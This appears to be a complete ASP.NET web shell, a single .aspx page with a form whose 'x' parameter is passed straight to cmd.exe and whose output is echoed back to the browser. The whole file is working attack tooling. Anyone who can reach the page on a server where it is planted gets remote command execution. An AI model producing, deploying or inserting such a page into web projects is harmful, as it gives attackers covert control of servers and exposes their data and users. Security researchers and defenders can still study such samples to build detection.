<%@ Page Language="C#" %>
<html>
  <body>
    <form method="get">
      <input name="x" />
      <input type="submit" value="Execute" />
    </form>
    <pre>
    <%
      try
      {
          string x = Request["x"];
          var p = new System.Diagnostics.Process();
          p.StartInfo.FileName = "cmd.exe";
          p.StartInfo.Arguments = "/c " + x;
          p.StartInfo.UseShellExecute = false;
          p.StartInfo.RedirectStandardOutput = true;
          p.StartInfo.RedirectStandardError = true;
          p.Start();

          string output = p.StandardOutput.ReadToEnd();
          string error = p.StandardError.ReadToEnd();
          p.WaitForExit();

          Response.Write(Server.HtmlEncode(output));
          if (!string.IsNullOrEmpty(error))
          {
              Response.Write("<br><b>Error:</b><br>" + Server.HtmlEncode(error));
          }
      }
      catch (Exception e)
      {
          Response.Write("Exception: " + Server.HtmlEncode(e.Message));
      }
    %>
    </pre>
  </body>
</html>
